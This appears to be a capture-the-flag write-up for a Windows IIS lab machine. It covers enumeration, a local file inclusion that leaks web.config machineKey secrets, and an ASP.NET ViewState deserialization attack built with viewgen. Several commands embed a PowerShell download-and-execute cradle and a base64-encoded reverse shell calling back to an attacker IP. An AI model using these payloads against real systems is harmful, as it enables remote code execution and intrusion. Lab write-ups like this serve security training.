
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV pov.htb --open    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 06:17 EDT
Nmap scan report for pov.htb (10.129.230.183)
Host is up (0.044s latency).
Not shown: 999 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
                                                                  
```

### Vhost Enumeration

```
gobuster vhost -u http://pov.htb -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://pov.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.pov.htb Status: 302 [Size: 152] [--> http://dev.pov.htb/portfolio/]
Progress: 20000 / 20000 (100.00%)
===============================================================
Finished
===============================================================
                                                      
```

```
echo '10.129.230.183 dev.pov.htb' | sudo tee -a /etc/hosts
10.129.230.183 dev.pov.htb

```

---
## Foothold

### Local File Inclusion on the download button

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 23 Sep 2026 10:37:03 GMT
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

```
curl -s http://dev.pov.htb/portfolio/ | grep VIEWSTATEGENERATOR
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="8E0F0FA3" />

```

### Exploitation ???

ASP.NET ViewState deserialization RCE ?

```shell
 git clone https://github.com/0xACB/viewgen ~/tools/viewgen
cd ~/tools/viewgen
pip3 install -r requirements.txt --break-system-packages

python3 viewgen.py \
  --validationalg SHA1 \
  --validationkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --decryptionalg AES \
  --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --generator "8E0F0FA3" \
  --payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
Cloning into '/home/kali/tools/viewgen'...
remote: Enumerating objects: 163, done.
remote: Counting objects: 100% (81/81), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 163 (delta 74), reused 66 (delta 66), pack-reused 82 (from 1)
Receiving objects: 100% (163/163), 39.13 KiB | 931.00 KiB/s, done.
Resolving deltas: 100% (99/99), done.
Defaulting to user installation because normal site-packages is not writeable
Collecting colored (from -r requirements.txt (line 1))
  Downloading colored-2.3.2-py3-none-any.whl.metadata (4.5 kB)
Collecting viewstate (from -r requirements.txt (line 2))
  Downloading viewstate-0.7.0-py3-none-any.whl.metadata (3.3 kB)
Collecting pycryptodome (from -r requirements.txt (line 3))
  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Downloading colored-2.3.2-py3-none-any.whl (20 kB)
Downloading viewstate-0.7.0-py3-none-any.whl (7.5 kB)
Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 10.9 MB/s  0:00:00
Installing collected packages: viewstate, pycryptodome, colored
Successfully installed colored-2.3.2 pycryptodome-3.23.0 viewstate-0.7.0
python3: can't open file '/home/kali/tools/viewgen/viewgen.py': [Errno 2] No such file or directory
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ ls
Dockerfile  install.sh  LICENSE  README.md  requirements.txt  viewgen
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ git clone https://github.com/0xACB/viewgen ~/tools/viewgen
cd ~/tools/viewgen
pip3 install -r requirements.txt --break-system-packages

python3 viewgen \   
  --validationalg SHA1 \
  --validationkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --decryptionalg AES \
  --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --generator "8E0F0FA3" \
  --payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
fatal: destination path '/home/kali/tools/viewgen' already exists and is not an empty directory.
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colored in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 1)) (2.3.2)
Requirement already satisfied: viewstate in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 2)) (0.7.0)
Requirement already satisfied: pycryptodome in /home/kali/.local/lib/python3.14/site-packages (from -r requirements.txt (line 3)) (3.23.0)
usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [--viewstateuserkey VIEWSTATEUSERKEY] [-c COMMAND] [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG] [--dkey DKEY] [--dalg DALG] [-u] [-e] [-f FILE] [--version]
               [payload]
viewgen: error: unrecognized arguments: --validationalg --validationkey 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg AES --decryptionkey 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 --generator 8E0F0FA3 --payload powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ python3 viewgen \
  --valg SHA1 \
  --vkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --dalg AES \
  --dkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  -m "8E0F0FA3" \
  -e \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
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
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/viewgen]
└─$ 

```

```
python3 viewgen \
  --valg SHA1 \
  --vkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --dalg AES \
  --dkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  -m "8E0F0FA3" \
  -e \
  -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.80:8000/shell.ps1')"
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

```

```
python3 viewgen \                                                                       
  --valg SHA1 \
  --vkey "5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --dalg AES \
  --dkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  -m "8E0F0FA3" \
  -e \
  -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwA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